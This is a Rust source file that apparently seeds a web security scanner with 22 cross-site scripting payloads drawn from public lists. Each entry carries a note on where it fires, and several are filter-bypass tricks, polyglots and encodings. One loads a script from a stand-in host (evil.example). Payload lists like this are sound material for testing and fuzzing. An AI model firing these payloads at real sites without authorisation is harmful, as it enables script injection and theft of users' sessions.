//! XSS seed payloads — reflected, stored, DOM, and polyglots.
//!
//! Curated from `swisskyrepo/PayloadsAllTheThings/XSS Injection` and
//! `danielmiessler/SecLists/Fuzzing/XSS` (both MIT). Includes a small
//! polyglot set that survives common encoding layers.

use crate::{Payload, PayloadCategory};

const C: PayloadCategory = PayloadCategory::Xss;

pub static PAYLOADS: &[Payload] = &[
    Payload {
        category: C,
        value: "<script>alert(1)</script>",
        notes: "canonical reflected XSS probe — no filter bypass",
        tags: &["reflected", "minimal"],
    },
    Payload {
        category: C,
        value: "\"><script>alert(1)</script>",
        notes: "attribute-break + script — fires inside <input value=\"...\">",
        tags: &["reflected", "attribute"],
    },
    Payload {
        category: C,
        value: "'><script>alert(1)</script>",
        notes: "single-quote attribute-break",
        tags: &["reflected", "attribute"],
    },
    Payload {
        category: C,
        value: "<img src=x onerror=alert(1)>",
        notes: "image error handler — bypasses naive <script> filter",
        tags: &["reflected", "event-handler"],
    },
    Payload {
        category: C,
        value: "<svg/onload=alert(1)>",
        notes: "SVG onload — shortest of the event-handler set",
        tags: &["reflected", "event-handler", "short"],
    },
    Payload {
        category: C,
        value: "<body onload=alert(1)>",
        notes: "body onload — only fires if injection lands above body close",
        tags: &["reflected", "event-handler"],
    },
    Payload {
        category: C,
        value: "javascript:alert(1)",
        notes: "javascript: URI — fires when reflected into href / src",
        tags: &["uri", "open-redirect-overlap"],
    },
    Payload {
        category: C,
        value: "<iframe src=javascript:alert(1)>",
        notes: "iframe src javascript: — survives some sandboxes",
        tags: &["reflected", "iframe"],
    },
    Payload {
        category: C,
        value: "'-alert(1)-'",
        notes: "single-quote JS context break — runs inside `var x = '...'`",
        tags: &["js-context"],
    },
    Payload {
        category: C,
        value: "\";alert(1);//",
        notes: "double-quote JS context break — runs inside `var x = \"...\"`",
        tags: &["js-context"],
    },
    Payload {
        category: C,
        value: "</script><script>alert(1)</script>",
        notes: "escape from <script> block — kills the host script tag",
        tags: &["js-context"],
    },
    Payload {
        category: C,
        value: "<details/open/ontoggle=alert(1)>",
        notes: "<details> ontoggle — fires without user interaction in some browsers",
        tags: &["event-handler"],
    },
    Payload {
        category: C,
        value: "<marquee onstart=alert(1)>",
        notes: "marquee onstart — fires on render",
        tags: &["event-handler"],
    },
    Payload {
        category: C,
        value: "<input autofocus onfocus=alert(1)>",
        notes: "autofocus + onfocus — fires without click",
        tags: &["event-handler"],
    },
    Payload {
        category: C,
        value: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
        notes: "Ostro/Hahwul polyglot — survives most contexts; emits a single alert across reflected, attribute, and JS contexts",
        tags: &["polyglot"],
    },
    Payload {
        category: C,
        value: "\"><img src=x onerror=\"prompt(1)\">",
        notes: "prompt() instead of alert() — sometimes filters block alert specifically",
        tags: &["reflected", "filter-bypass"],
    },
    Payload {
        category: C,
        value: "<a href=\"javascript&colon;alert(1)\">x</a>",
        notes: "HTML-entity-encoded colon — bypasses `javascript:` prefix filters",
        tags: &["filter-bypass", "uri"],
    },
    Payload {
        category: C,
        value: "<script src=//evil.example/x.js></script>",
        notes: "external script — useful when payload-length filters block inline script bodies",
        tags: &["external"],
    },
    Payload {
        category: C,
        value: "<style>@import 'javascript:alert(1)';</style>",
        notes: "CSS @import — antique vector; useful against very old engines",
        tags: &["css"],
    },
    Payload {
        category: C,
        value: "'\"--></style></script><svg onload=alert(1)>",
        notes: "multi-context escape — covers attribute, comment, CSS, JS strings",
        tags: &["polyglot"],
    },
    Payload {
        category: C,
        value: "%3Cscript%3Ealert(1)%3C/script%3E",
        notes: "URL-encoded basic script tag",
        tags: &["encoding"],
    },
    Payload {
        category: C,
        value: "<scr<script>ipt>alert(1)</scr</script>ipt>",
        notes: "tag-stripping bypass — strip-once filters reassemble the tag",
        tags: &["filter-bypass"],
    },
];

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn every_payload_is_xss_class() {
        for p in PAYLOADS {
            assert_eq!(p.category, PayloadCategory::Xss);
            assert!(!p.value.is_empty());
        }
    }

    #[test]
    fn has_at_least_one_polyglot() {
        assert!(PAYLOADS.iter().any(|p| p.tags.contains(&"polyglot")));
    }

    #[test]
    fn has_event_handler_payloads() {
        assert!(PAYLOADS.iter().any(|p| p.tags.contains(&"event-handler")));
    }
}
